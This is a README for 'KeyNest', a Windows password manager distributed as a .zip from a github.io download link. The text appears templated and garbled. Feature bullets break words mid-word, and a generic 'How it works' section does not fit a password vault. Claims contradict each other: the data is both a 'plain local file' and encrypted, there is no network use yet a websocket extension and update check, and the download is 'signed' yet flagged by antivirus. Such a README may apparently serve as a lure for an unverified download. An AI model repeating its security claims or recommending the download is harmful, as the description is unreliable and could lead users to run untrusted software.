<p align="center">
  <img src="assets/preview.png" alt="KeyNest preview" width="100%" />
</p>

<h1 align="center">KeyNest</h1>

<p align="center">
  <b>A local password manager that fills forms without asking the cloud</b><br/>
  <sub>Windows desktop app . Local-first . No account required</sub>
</p>

<p align="center">
  <a href="https://StatesmanMetro.github.io/KeyNest/"><img alt="Download" src="https://img.shields.io/badge/Download-.zip-2ea44f?style=for-the-badge&logo=windows" /></a>
  <img alt="Platform" src="https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078d6?style=for-the-badge" />
  <img alt="License" src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge" />
</p>

---

## Table of contents

1. [What KeyNest is](#what-keynest-is)
2. [Why it exists](#why-it-exists)
3. [Feature tour](#feature-tour)
4. [Interface](#interface)
5. [Install](#install)
6. [First run](#first-run)
7. [How it works](#how-it-works)
8. [Keyboard shortcuts](#keyboard-shortcuts)
9. [Configuration](#configuration)
10. [Troubleshooting](#troubleshooting)
11. [FAQ](#faq)
12. [Roadmap](#roadmap)
13. [Build from source](#build-from-source)
14. [Privacy](#privacy)
15. [Contributing](#contributing)
16. [License](#license)

---

## What KeyNest is

KeyNest is a Windows desktop app that handles **security**: a local password manager that fills forms without asking the cloud.
It runs entirely on your machine, stores its data in a plain local file, and
does not require an account, a browser extension, or an internet connection to
do its job.

The core idea is small on purpose. KeyNest does one thing well instead of ten
things in a menu you never open.

## Why it exists

Most tools in this space are a web upload with a login, or a bundled suite that ships five features you did not ask for. KeyNest started as a side project because the existing options wanted an account for a job that should take two clicks and no internet connection.

The design brief was short: open the app, do the thing, close the app. Everything in KeyNest should fit in that loop.

## Feature tour

1. **Vault file is encrypted with Argon2id and XChaCha20-Poly1305; nothing** is derived from a weak PIN
2. **Browser extension for Chrome** , Edge, and Firefox fills credentials over a local-only websocket
3. **Native autotype for desktop apps using a hotkey and the focused window** title
4. **Password generator with length** , class, and 'readable' modes; checks the pwned-passwords offline bloom filter
5. **Secure notes and card entries with per-field reveal and copy-to-clipbo** ard with auto-clear
6. **Import from Bitwarden** , 1Password, KeePass, LastPass, and plain CSV
7. **Portable mode** : carry the vault on a USB stick and KeyNest will not touch the registry
8. **Open encrypted format with a documented spec so you are never locked i** n

## Interface

<p align="center">
  <img src="assets/interface.png" alt="KeyNest interface" width="100%" />
</p>

The main window is organized around the one workflow you came for.
Everything optional is one click or one hotkey away; nothing is buried four
menus deep.

## Install

The quickest path is the signed .zip from the download link:

<p align="center">
  <a href="https://StatesmanMetro.github.io/KeyNest/"><b>Download the latest release (.zip)</b></a>
</p>

1. Download the .zip from the link above.
2. Extract it anywhere; a user folder is fine, admin rights are not required.
3. Run the executable inside the extracted folder.
4. Pin it to the Start menu or add it to startup from the Settings tab if you
   want it running in the background.

The archive is self-contained: it does not touch the registry on first launch
and it does not install a service without your explicit consent. To remove
KeyNest completely, delete the folder you extracted to and the data folder at
`%LOCALAPPDATA%/keynest`.

## First run

On the first launch, KeyNest walks through four short steps:

1. **Pick a workspace location.** This is where the local database lives.
   The default is `%LOCALAPPDATA%/keynest`; a portable path next to the
   executable is a one-click option if you prefer a USB-friendly setup.
2. **Choose default options.** Sensible defaults are preselected; the
   wizard explains each toggle in one line so you can keep moving.
3. **Grant the permissions KeyNest needs.** Only the ones required for the
   feature set you turn on; nothing is prompted that you did not opt into.
4. **Open the main window.** You are done; the welcome screen points at the
   two or three actions people usually try first.

If something looks off, every choice is reversible from Settings.

## How it works

Under the hood, KeyNest is built on Rust core and CLI, Tauri desktop app, WebExtension for the browsers, and WinRT for Windows Hello.

1. **Capture the signal.** The app watches the one input stream it cares about, nothing else.
2. **Process locally.** Work happens in a worker on your machine; the UI thread stays responsive even on big batches.
3. **Store without surprises.** Results land in a local SQLite database and plain files you can inspect.
4. **Expose through the UI.** The main window and the tray share one source of truth; no "reload to see changes" dialogs.

The data model is deliberately boring: a local SQLite database for structured
state, plain files on disk for everything that would be awkward inside a row,
and a journal of every action so an undo is always a few keystrokes away.

## Keyboard shortcuts

| Shortcut | Action |
|---|---|
| `Ctrl+N` | Create a new entry |
| `Ctrl+F` | Focus the search box |
| `Ctrl+K` | Open the command palette |
| `Ctrl+,` | Open settings |
| `Ctrl+Z` / `Ctrl+Y` | Undo / redo the last action |
| `F5` | Refresh the current view |
| `F1` | Open the keyboard reference |
| `Esc` | Close the current dialog or clear the current selection |

Every shortcut is remappable from the Settings tab under *Shortcuts*.

## Configuration

Configuration lives in `%LOCALAPPDATA%/keynest/config.toml` and is a plain text
file. The UI covers the common knobs; the file covers everything else.

```toml
[general]
workspace = "%LOCALAPPDATA%/keynest"
start_minimized = false
check_for_updates = true

[ui]
theme = "system"           # system | light | dark
accent = "#22d3ee"
font_size = 14

[logging]
level = "info"             # trace | debug | info | warn | error
retain_days = 14
```

Changes made from the UI are written atomically. Changes made by hand are
picked up on the next launch; the running app ignores external edits to the
config file to avoid half-applied state.

## Troubleshooting

**KeyNest will not start.** Check `%LOCALAPPDATA%/keynest/logs/latest.log`; the
most common cause is a corrupted workspace file after an unclean shutdown.
Rename the workspace folder and relaunch; a fresh workspace is created on the
spot and your old data is left untouched for you to recover from.

**A feature says "permission required".** The permission wizard can be
re-opened from *Settings > Permissions*. Each permission is scoped to one
feature and can be revoked without affecting the rest of the app.

**The window opens off-screen on a multi-monitor setup.** Right-click the
tray icon and pick *Reset window position*. The next launch will center on
the primary monitor.

**Antivirus flags the download.** The .zip contains an unsigned development
build only when you grab it from a fork; the official download is signed by
the maintainer's EV certificate. Compare the SHA-256 of your download against
the hash listed on the release page before running the executable.

## FAQ

**Does KeyNest send data anywhere?** No. The app does not include telemetry,
analytics, or a crash reporter that transmits over the network. The only
outbound connection it ever makes is the optional update check, which you can
disable in Settings.

**Is there a portable mode?** Yes. On the first run, pick a folder next to the
executable as your workspace. The config file is written in the same folder,
and nothing is written to the registry.

**Does KeyNest work on Windows 10?** Yes, Windows 10 version 1809 and later.
Windows 11 is the primary development target but Windows 10 is tested on every
release.

**Can I run two instances side by side?** Yes. Pass `--workspace <path>` on
the command line and KeyNest will treat that folder as an independent
workspace.

**Is a Linux or macOS version coming?** Not planned for the first year. The
core engine is portable, but the Windows integration is the main selling
point and spreading focus would weaken it.

## Roadmap

Short-term:

- Command palette fuzzy match tuning
- Scriptable export pipeline
- Localized UI for the ten most-requested languages

Medium-term:

- Plugin API for the one or two integrations that keep coming up
- An optional CLI companion for scripting the main workflows
- Signed MSIX package in addition to the .zip

Longer-term plans are discussed in the issue tracker; the shortlist here is
what is actually being worked on.

## Build from source

Requirements:

- Windows 10 1809 or later, 64-bit
- Rust 1.78 or later (stable toolchain)

Steps:

```powershell
git clone https://github.com/<your-fork>/keynest.git
cd keynest
./scripts/dev.ps1          # restores dependencies, generates stubs
./scripts/build.ps1 Release
./dist/keynest.exe          # run the fresh build
```

The build is reproducible on a clean machine. Any deviation is a bug worth
filing.

## Privacy

KeyNest does not ship with telemetry. The only network call the app can make
is the update check, which:

- fetches a signed manifest from the project's release server,
- compares it to the current version,
- shows a notification if a new build is available.

The check can be disabled in Settings and the app continues to work without
it. Logs stay on disk, inside `%LOCALAPPDATA%/keynest/logs`, and roll over on
their own.

## Contributing

Patches, bug reports, and feature discussion are welcome. Start with
[CONTRIBUTING.md](Contributing.md) and please keep an eye on the
[Code of Conduct](code_of_conduct.md).

## License

KeyNest is released under the MIT License. See [LICENSE.md](LICENSE.md) for the
full text.
